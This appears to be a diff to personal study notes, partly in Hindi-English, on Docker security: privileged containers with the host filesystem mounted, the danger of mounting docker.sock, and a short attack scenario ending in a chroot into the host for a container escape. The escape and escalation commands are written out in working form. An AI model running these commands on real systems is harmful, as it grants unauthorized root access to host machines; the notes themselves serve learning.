@@ -8,3 +8,24 @@
 2) privileged escalation attack via volume mounts:
     docker run -dit --name karma --privileged -v /:/mnt ubuntu
         - you can see the all the data root user.
+
+3) docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it ubuntu bash
+    #docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it ubuntu bash
+        | Part | Matlab |
+        |------|--------|
+        | `-v /var/run/docker.sock:/var/run/docker.sock` | Host ka Docker socket container ke andar mount karo |
+        | `--rm` | Container band hone pe delete ho jaye |
+        | `-it ubuntu bash` | Ubuntu container mein interactive bash shell | 
+        ---
+        ### Docker Socket (`docker.sock`) Kya Hai?
+        docker.sock = Docker daemon se baat karne ka gateway
+        Jisko bhi is socket ka access milta hai — woh poora Docker control kar sakta hai.
+
+    #docker run -it --privileged -v /:/mnt --rm -it ubuntu chroot /mnt bash
+        Attack Scenario — Kya Ho Sakta Hai:
+        Agar koi attacker container ke andar aa gaya, toh woh yeh kar sakta hai:
+                # Container ke andar docker install karo
+                apt install docker.io -y
+                # Ab HOST ka filesystem mount karo naye container mein
+                docker run -v /:/host --rm -it ubuntu chroot /host bash
+                # Ab tum HOST machine pe ho — container escape complete!
